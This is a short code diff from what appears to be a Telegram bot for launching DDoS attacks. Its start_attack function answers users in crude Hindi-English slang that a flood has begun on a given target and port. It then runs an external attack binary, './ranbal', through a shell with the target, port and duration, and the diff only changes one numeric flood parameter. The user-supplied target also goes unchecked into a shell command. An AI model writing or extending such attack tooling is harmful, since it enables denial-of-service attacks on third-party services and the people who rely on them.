@@ -46,7 +46,7 @@ def start_attack(target, port, duration, message):
         feedback_pending[user_id] = True  # ✅ Feedback required
         bot.reply_to(message, f"✅ Chudai started on {target}:{port} for {duration} seconds. \n Send FEEDBACK \n \n DDos Na lge ya use stop krna ho tab use /ruko")
 
-        attack_command = f"{os.path.abspath('./ranbal')} {target} {port} {duration} 10 200"
+        attack_command = f"{os.path.abspath('./ranbal')} {target} {port} {duration} 11 200"
         process = subprocess.Popen(attack_command, shell=True, preexec_fn=os.setsid)
 
         # ✅ Process track karo
